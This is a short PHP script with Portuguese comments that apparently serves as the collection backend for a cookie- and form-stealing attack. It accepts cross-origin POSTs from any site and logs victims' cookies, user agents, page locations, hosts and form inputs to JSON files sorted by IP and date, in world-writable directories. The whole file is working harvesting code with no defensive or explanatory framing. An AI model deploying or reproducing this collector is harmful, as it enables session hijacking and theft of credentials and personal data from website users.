<?php

header("Access-Control-Allow-Origin: *");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    define("LOGS_DIR", __DIR__ . "/logs/");

    $curDate = date("d-m-Y");
    $curTime = date("H:i:s");

    $remoteIP = $_SERVER["REMOTE_ADDR"];
    $location = $_POST["location"] ?? "";
    $uagents = $_POST["uagents"] ?? "";
    $cookies = $_POST["cookies"] ?? "";
    $name = $_POST["name"] ?? "";
    $host = $_POST["host"] ?? "";
    $inputs = $_POST["inputs"] ?? "";

    $data = [
        "remote_ip" => $remoteIP,
        "location" => $location,
        "uagents" => $uagents,
        "cookies" => $cookies,
        "name" => $name,
        "host" => $host,
        "date" => $curDate,
        "time" => $curTime,
        "inputs" => $inputs,
    ];

    $directory = LOGS_DIR . $remoteIP . "/" . $curDate;
    $logfile = $directory . "/" . $curTime . ".log";

    // Crie diretórios se eles não existirem
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    // Escreva dados no arquivo de log
    file_put_contents($logfile, json_encode($data, JSON_PRETTY_PRINT));

    echo "200 OK";
} else {
    echo "500 Internal Server Error";
}
?>
